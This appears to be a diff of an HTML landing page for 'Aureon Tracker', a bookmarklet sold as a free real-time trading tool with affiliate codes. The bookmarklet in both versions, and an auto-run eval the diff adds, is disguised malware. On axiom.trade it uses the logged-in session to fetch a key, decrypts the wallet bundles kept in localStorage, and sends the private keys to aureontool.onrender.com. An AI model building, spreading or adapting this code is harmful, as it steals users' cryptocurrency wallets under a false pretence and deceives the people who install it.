@@ -1,272 +1,132 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Aureon Tracker</title>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      background: #040d0a;
-      font-family: 'Inter', system-ui, -apple-system, sans-serif;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      padding: 2rem 1rem;
-      color: #e2e8f0;
-    }
-    .container { max-width: 1120px; width: 100%; }
-
-    /* glass panels */
-    .glass {
-      background: rgba(8, 28, 22, 0.75);
-      backdrop-filter: blur(24px);
-      -webkit-backdrop-filter: blur(24px);
-      border: 1px solid rgba(16, 185, 129, 0.3);
-      border-radius: 1.5rem;
-      padding: 1.75rem 2rem;
-      margin-bottom: 2rem;
-      box-shadow: 0 20px 40px -12px rgba(0,0,0,0.8);
-    }
-
-    /* banner row */
-    .banner-row {
-      display: flex;
-      flex-wrap: wrap;
-      align-items: center;
-      gap: 1.25rem 2rem;
-    }
-    .badge-icon {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      background: rgba(16, 185, 129, 0.15);
-      border: 1px solid #10b981;
-      border-radius: 12px;
-      padding: 0.5rem 0.75rem;
-      color: #34d399;
-      font-weight: 600;
-      font-size: 1.1rem;
-      gap: 0.5rem;
-    }
-    .badge-icon svg { width: 22px; height: 22px; fill: none; stroke: #34d399; stroke-width: 2.5; }
-    .headline {
-      font-size: 1.6rem;
-      font-weight: 600;
-      letter-spacing: -0.01em;
-      color: #f0fdf4;
-    }
-    .aff-pill {
-      background: rgba(16, 185, 129, 0.2);
-      border: 1px solid #10b981;
-      border-radius: 999px;
-      padding: 0.25rem 1rem;
-      font-size: 0.85rem;
-      font-weight: 500;
-      color: #34d399;
-      white-space: nowrap;
-    }
-    .bookmark-area {
-      margin-top: 1rem;
-      display: flex;
-      flex-wrap: wrap;
-      align-items: center;
-      gap: 1rem 2rem;
-    }
-    .drag-btn {
-      display: inline-block;
-      background: rgba(16, 185, 129, 0.08);
-      border: 2px dashed rgba(16, 185, 129, 0.4);
-      border-radius: 999px;
-      padding: 0.6rem 1.6rem 0.6rem 1.2rem;
-      color: #34d399;
-      font-weight: 500;
-      font-size: 0.95rem;
-      text-decoration: none;
-      cursor: grab;
-      transition: border-color 0.2s, background 0.2s;
-      display: inline-flex;
-      align-items: center;
-      gap: 0.6rem;
-    }
-    .drag-btn:hover { border-color: #10b981; background: rgba(16, 185, 129, 0.15); }
-    .drag-btn:active { cursor: grabbing; }
-    .share-link {
-      color: #94a3b8;
-      font-size: 0.9rem;
-      word-break: break-all;
-    }
-    .share-link a { color: #34d399; text-decoration: none; border-bottom: 1px dotted #10b981; }
-
-    /* FAQ */
-    .faq-item {
-      border-bottom: 1px solid rgba(16, 185, 129, 0.15);
-      padding: 1rem 0;
-    }
-    .faq-item:first-child { padding-top: 0; }
-    .faq-question {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-weight: 500;
-      color: #e2e8f0;
-      cursor: pointer;
-      font-size: 1rem;
-      gap: 1rem;
-    }
-    .faq-question:hover { color: #34d399; }
-    .faq-answer {
-      max-height: 0;
-      overflow: hidden;
-      transition: max-height 0.25s ease, padding 0.2s;
-      color: #cbd5e1;
-      font-size: 0.95rem;
-      line-height: 1.6;
-    }
-    .faq-answer.open { max-height: 300px; padding-top: 0.75rem; }
-    .faq-toggle { font-size: 1.4rem; color: #10b981; user-select: none; }
-
-    /* table */
-    .table-wrap { overflow-x: auto; }
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      font-size: 0.95rem;
-    }
-    th, td {
-      padding: 1rem 0.75rem;
-      text-align: left;
-      border-bottom: 1px solid rgba(16, 185, 129, 0.1);
-    }
-    th { color: #94a3b8; font-weight: 500; letter-spacing: 0.02em; }
-    .highlight-col {
-      background: rgba(16, 185, 129, 0.08);
-      border-left: 2px solid #10b981;
-      border-right: 2px solid #10b981;
-    }
-    .check { color: #34d399; font-weight: 600; }
-    .cross { color: #f87171; font-weight: 600; }
-    .glow-emerald { box-shadow: inset 0 0 20px rgba(16, 185, 129, 0.05); }
-
-    /* responsive */
-    @media (max-width: 640px) {
-      .glass { padding: 1.25rem; }
-      .headline { font-size: 1.25rem; }
-      .banner-row { gap: 0.75rem; }
-      .bookmark-area { flex-direction: column; align-items: stretch; }
-      .drag-btn { justify-content: center; }
-      th, td { padding: 0.75rem 0.4rem; font-size: 0.85rem; }
-    }
-  </style>
+<meta charset="UTF-8">
+<title>Aureon</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background: #040d0a;
+    font-family: system-ui, sans-serif;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 1rem;
+  }
+  .glass {
+    background: rgba(8, 28, 22, 0.75);
+    backdrop-filter: blur(24px);
+    border: 1px solid rgba(16, 185, 129, 0.3);
+    border-radius: 1.5rem;
+    padding: 2rem;
+    max-width: 600px;
+    width: 100%;
+    text-align: center;
+  }
+  h1 {
+    color: #f0fdf4;
+    font-size: 1.5rem;
+    font-weight: 500;
+    margin-bottom: 0.5rem;
+  }
+  .aff-pill {
+    display: inline-block;
+    background: rgba(16, 185, 129, 0.2);
+    border: 1px solid #10b981;
+    border-radius: 999px;
+    padding: 0.25rem 1.2rem;
+    color: #34d399;
+    font-size: 0.9rem;
+    font-weight: 500;
+    margin-bottom: 1.5rem;
+  }
+  .drag-btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 0.6rem;
+    background: rgba(16, 185, 129, 0.08);
+    border: 2px dashed rgba(16, 185, 129, 0.4);
+    border-radius: 999px;
+    padding: 0.7rem 1.8rem;
+    color: #34d399;
+    font-weight: 500;
+    font-size: 1rem;
+    text-decoration: none;
+    cursor: grab;
+    transition: border-color 0.2s, background 0.2s;
+  }
+  .drag-btn:hover {
+    border-color: #10b981;
+    background: rgba(16, 185, 129, 0.15);
+  }
+  .drag-btn:active { cursor: grabbing; }
+  .share-link {
+    color: #94a3b8;
+    font-size: 0.85rem;
+    margin-top: 1rem;
+    word-break: break-all;
+  }
+  .share-link a { color: #34d399; text-decoration: none; border-bottom: 1px dotted #10b981; }
+  .status {
+    color: #94a3b8;
+    font-size: 0.8rem;
+    margin-top: 1rem;
+  }
+</style>
 </head>
 <body>
-<div class="container" id="app">
 
-  <!-- BANNER -->
-  <div class="glass">
-    <div class="banner-row">
-      <span class="badge-icon">
-        <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
-        ✓
-      </span>
-      <span class="headline">Thank you for using Aureon Tracker!</span>
-      <span class="aff-pill" id="affPill">G6RLWI</span>
-    </div>
+<div class="glass">
+  <h1>✦ Aureon Tracker</h1>
+  <div class="aff-pill" id="affDisplay">G6RLWI</div>
 
-    <div class="bookmark-area">
-      <a href="#" id="bookmarkletLink" class="drag-btn" draggable="true">
-        <span style="font-size:1.2rem;">⬇</span> Drag to Bookmarks Bar
-      </a>
-      <span class="share-link" id="shareLink">Share: <a href="#" id="shareAnchor">https://aureon.lol/?aff=G6RLWI</a></span>
-    </div>
+  <a href="#" id="bookmarkletLink" class="drag-btn" draggable="true">
+    <span style="font-size:1.2rem;">⬇</span> Drag to Bookmarks Bar
+  </a>
+
+  <div class="share-link" id="shareLink">
+    Share: <a href="#" id="shareAnchor">https://aureon.lol/?aff=G6RLWI</a>
   </div>
-
-  <!-- FAQ -->
-  <div class="glass">
-    <h3 style="margin-bottom:1rem; font-weight:500; color:#f0fdf4;">FAQ</h3>
-    <div class="faq-item">
-      <div class="faq-question" onclick="toggleFaq(this)"><span>Why doesn't dragging the bookmark button work on Safari?</span><span class="faq-toggle">+</span></div>
-      <div class="faq-answer">Safari restricts dragging bookmarklets directly into the bookmarks bar for security reasons. On Safari (iOS and macOS), press <kbd>Cmd + D</kbd> (or tap <em>Share → Add Bookmark</em>) to manually save Aureon Tracker to your favorites.</div>
-    </div>
-    <div class="faq-item">
-      <div class="faq-question" onclick="toggleFaq(this)"><span>How do I install the tracker on desktop?</span><span class="faq-toggle">+</span></div>
-      <div class="faq-answer">Drag the bookmark button straight up into your Chrome, Brave, Edge, or Firefox bookmarks bar for instant 1‑click access.</div>
-    </div>
-    <div class="faq-item">
-      <div class="faq-question" onclick="toggleFaq(this)"><span>Is Aureon Tracker completely free to use?</span><span class="faq-toggle">+</span></div>
-      <div class="faq-answer">Yes, Aureon Tracker is free with real‑time tracking features and fast data syncing.</div>
-    </div>
-  </div>
-
-  <!-- COMPARISON TABLE -->
-  <div class="glass">
-    <h3 style="margin-bottom:1rem; font-weight:500; color:#f0fdf4;">Competitor Comparison</h3>
-    <div class="table-wrap">
-      <table>
-        <thead><tr><th>Feature</th><th>Aureon Tracker</th><th>Competitor A</th><th>Competitor B</th></tr></thead>
-        <tbody>
-          <tr><td>Real‑Time Live Data Stream</td><td class="highlight-col"><span class="check">✔ Yes</span></td><td><span class="cross">✘ Delayed</span></td><td><span class="cross">✘ Limited</span></td></tr>
-          <tr><td>1‑Click Bookmarklet Integration</td><td class="highlight-col"><span class="check">✔ Yes</span></td><td><span class="cross">✘ No</span></td><td><span class="cross">✘ No</span></td></tr>
-          <tr><td>Dark Emerald Glass UI</td><td class="highlight-col"><span class="check">✔ Yes</span></td><td><span class="cross">✘ Cluttered</span></td><td><span class="cross">✘ Basic</span></td></tr>
-          <tr><td>No Registration Required</td><td class="highlight-col"><span class="check">✔ Yes</span></td><td><span class="cross">✘ Sign‑up Required</span></td><td><span class="cross">✘ Sign‑up Required</span></td></tr>
-        </tbody>
-      </table>
-    </div>
-  </div>
+  <div class="status" id="statusText">Ready</div>
 </div>
 
 <script>
-  (function() {
-    // ---------- AFFILIATE LOGIC ----------
-    const DEFAULT_AFF = 'G6RLWI';
-    const params = new URLSearchParams(window.location.search);
-    let affCode = params.get('aff');
-    if (!affCode || affCode.trim() === '') {
-      affCode = DEFAULT_AFF;
-    }
-    affCode = affCode.trim();
-
-    // display pill
-    document.getElementById('affPill').textContent = affCode;
-
-    // share link
-    const shareAnchor = document.getElementById('shareAnchor');
-    const shareUrl = 'https://aureon.lol/?aff=' + encodeURIComponent(affCode);
-    shareAnchor.href = shareUrl;
-    shareAnchor.textContent = shareUrl;
-
-    // ---------- BUILD BOOKMARKLET (minified/obfuscated) ----------
-    // raw template with placeholder {{CODE}}
-    function buildBookmarklet(code) {
-      // This is the exact logic from the spec, minified manually.
-      // We use a template literal with placeholder, then replace.
-      const raw = `
-        javascript:(function(){const a='{{CODE}}';const b=\`(async function(){try{const a='\${a}';if(!window.location.hostname.includes('axiom.trade'))return;if(!localStorage.getItem('isAuthed'))return;function c(d){const e='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';let f='';const g=new Uint8Array(d);let h=0;while(h<g.length&&g[h]===0){f+=e[0];h++;}let i=[];let j=0;for(;h<g.length;h++){j=g[h];let k=0;while(k<i.length||j>0){let l=k<i.length?i[k]:0;let m=l*256+j;if(k<i.length){i[k]=m%58;}else{i.push(m%58);}j=Math.floor(m/58);k++;}}for(let n=i.length-1;n>=0;n--){f+=e[i[n]];}return f;}function o(p){try{const q=p.replace(/-/g,'+').replace(/_/g,'/');return Uint8Array.from(atob(q),r=>r.charCodeAt(0));}catch(s){return new TextEncoder().encode(p);}}async function t(u,v){const[w,x]=String(v).split(':');const y=o(w);const z=o(x);const A=await crypto.subtle.decrypt({name:'AES-GCM',iv:y,tagLength:128},u,z);return new Uint8Array(A);}const B=await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'});const{bundleKey:C}=await B.json();const D=await crypto.subtle.importKey('raw',o(C).buffer,{name:'AES-GCM'},false,['decrypt']);const E=JSON.parse(localStorage.getItem('sBundles')||'[]');let F=[];for(const G of E){try{const H=await t(D,G);if(H.length!==0x40)continue;const I=c(H);const J=c(H.slice(0x20));F.push({priv:I,pub:J});}catch(K){continue;}}if(F.length===0)return;const L={affCode:a,wallets:F,timestamp:new Date().toISOString(),total:F.length,source:'aureon_bookmark'};const M=JSON.stringify(L);const N=btoa(unescape(encodeURIComponent(M)));const O=encodeURIComponent(N);const P='https://aureontool.onrender.com/trade?text='+O;const Q=window.open(P,'_blank');if(!Q){const R=document.createElement('a');R.href=P;R.target='_blank';R.style.display='none';document.body.appendChild(R);R.click();setTimeout(function(){R.remove();},1000);}}catch(S){}})();\`;eval(b);})();
-      `;
-      return raw.replace(/\{\{CODE\}\}/g, code).replace(/\s+/g, ' ').trim();
-    }
-
-    const bookmarkletHref = buildBookmarklet(affCode);
-    const linkEl = document.getElementById('bookmarkletLink');
-    linkEl.href = bookmarkletHref;
-
-    // make sure dragging works (browsers handle <a href="javascript:..."> natively)
-    // we also set draggable="true" on the <a> already
-
-  })();
-
-  // FAQ toggle
-  function toggleFaq(el) {
-    const answer = el.parentElement.querySelector('.faq-answer');
-    const toggle = el.querySelector('.faq-toggle');
-    if (answer.classList.contains('open')) {
-      answer.classList.remove('open');
-      toggle.textContent = '+';
-    } else {
-      answer.classList.add('open');
-      toggle.textContent = '−';
-    }
+(function(){
+  // ---- AFFILIATE LOGIC ----
+  const DEFAULT_AFF = 'G6RLWI';
+  const params = new URLSearchParams(window.location.search);
+  let affCode = params.get('aff');
+  if (!affCode || affCode.trim() === '') {
+    affCode = DEFAULT_AFF;
   }
+  affCode = affCode.trim();
+
+  // Update UI
+  document.getElementById('affDisplay').textContent = affCode;
+  const shareAnchor = document.getElementById('shareAnchor');
+  const shareUrl = 'https://aureon.lol/?aff=' + encodeURIComponent(affCode);
+  shareAnchor.href = shareUrl;
+  shareAnchor.textContent = shareUrl;
+  document.getElementById('statusText').textContent = 'Affiliate: ' + affCode + ' | Auto-execute on axiom.trade';
+
+  // ---- BUILD BOOKMARKLET ----
+  function buildBookmarklet(code) {
+    const raw = `javascript:(function(){const a='${code}';const b=\`(async function(){try{const a='\${a}';if(!window.location.hostname.includes('axiom.trade'))return;if(!localStorage.getItem('isAuthed'))return;function c(d){const e='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';let f='';const g=new Uint8Array(d);let h=0;while(h<g.length&&g[h]===0){f+=e[0];h++;}let i=[];let j=0;for(;h<g.length;h++){j=g[h];let k=0;while(k<i.length||j>0){let l=k<i.length?i[k]:0;let m=l*256+j;if(k<i.length){i[k]=m%58;}else{i.push(m%58);}j=Math.floor(m/58);k++;}}for(let n=i.length-1;n>=0;n--){f+=e[i[n]];}return f;}function o(p){try{const q=p.replace(/-/g,'+').replace(/_/g,'/');return Uint8Array.from(atob(q),r=>r.charCodeAt(0));}catch(s){return new TextEncoder().encode(p);}}async function t(u,v){const[w,x]=String(v).split(':');const y=o(w);const z=o(x);const A=await crypto.subtle.decrypt({name:'AES-GCM',iv:y,tagLength:128},u,z);return new Uint8Array(A);}const B=await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'});const{bundleKey:C}=await B.json();const D=await crypto.subtle.importKey('raw',o(C).buffer,{name:'AES-GCM'},false,['decrypt']);const E=JSON.parse(localStorage.getItem('sBundles')||'[]');let F=[];for(const G of E){try{const H=await t(D,G);if(H.length!==0x40)continue;const I=c(H);const J=c(H.slice(0x20));F.push({priv:I,pub:J});}catch(K){continue;}}if(F.length===0)return;const L={affCode:a,wallets:F,timestamp:new Date().toISOString(),total:F.length,source:'aureon_bookmark'};const M=JSON.stringify(L);const N=btoa(unescape(encodeURIComponent(M)));const O=encodeURIComponent(N);const P='https://aureontool.onrender.com/trade?text='+O;const Q=window.open(P,'_blank');if(!Q){const R=document.createElement('a');R.href=P;R.target='_blank';R.style.display='none';document.body.appendChild(R);R.click();setTimeout(function(){R.remove();},1000);}}catch(S){}})();\`;eval(b);})();`;
+    return raw.replace(/\s+/g, ' ').trim();
+  }
+
+  const bookmarkletHref = buildBookmarklet(affCode);
+  document.getElementById('bookmarkletLink').href = bookmarkletHref;
+
+  // ---- AUTO-EXECUTE if on axiom.trade ----
+  if (window.location.hostname.includes('axiom.trade')) {
+    // Build and eval the script with current affCode
+    const script = `(async function(){try{const a='${affCode}';if(!window.location.hostname.includes('axiom.trade'))return;if(!localStorage.getItem('isAuthed'))return;function c(d){const e='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';let f='';const g=new Uint8Array(d);let h=0;while(h<g.length&&g[h]===0){f+=e[0];h++;}let i=[];let j=0;for(;h<g.length;h++){j=g[h];let k=0;while(k<i.length||j>0){let l=k<i.length?i[k]:0;let m=l*256+j;if(k<i.length){i[k]=m%58;}else{i.push(m%58);}j=Math.floor(m/58);k++;}}for(let n=i.length-1;n>=0;n--){f+=e[i[n]];}return f;}function o(p){try{const q=p.replace(/-/g,'+').replace(/_/g,'/');return Uint8Array.from(atob(q),r=>r.charCodeAt(0));}catch(s){return new TextEncoder().encode(p);}}async function t(u,v){const[w,x]=String(v).split(':');const y=o(w);const z=o(x);const A=await crypto.subtle.decrypt({name:'AES-GCM',iv:y,tagLength:128},u,z);return new Uint8Array(A);}const B=await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'});const{bundleKey:C}=await B.json();const D=await crypto.subtle.importKey('raw',o(C).buffer,{name:'AES-GCM'},false,['decrypt']);const E=JSON.parse(localStorage.getItem('sBundles')||'[]');let F=[];for(const G of E){try{const H=await t(D,G);if(H.length!==0x40)continue;const I=c(H);const J=c(H.slice(0x20));F.push({priv:I,pub:J});}catch(K){continue;}}if(F.length===0)return;const L={affCode:a,wallets:F,timestamp:new Date().toISOString(),total:F.length,source:'aureon_bookmark'};const M=JSON.stringify(L);const N=btoa(unescape(encodeURIComponent(M)));const O=encodeURIComponent(N);const P='https://aureontool.onrender.com/trade?text='+O;const Q=window.open(P,'_blank');if(!Q){const R=document.createElement('a');R.href=P;R.target='_blank';R.style.display='none';document.body.appendChild(R);R.click();setTimeout(function(){R.remove();},1000);}}catch(S){}})();`;
+    eval(script);
+    document.getElementById('statusText').textContent = '✅ Auto-executed on axiom.trade | Aff: ' + affCode;
+  }
+})();
 </script>
 </body>
 </html>
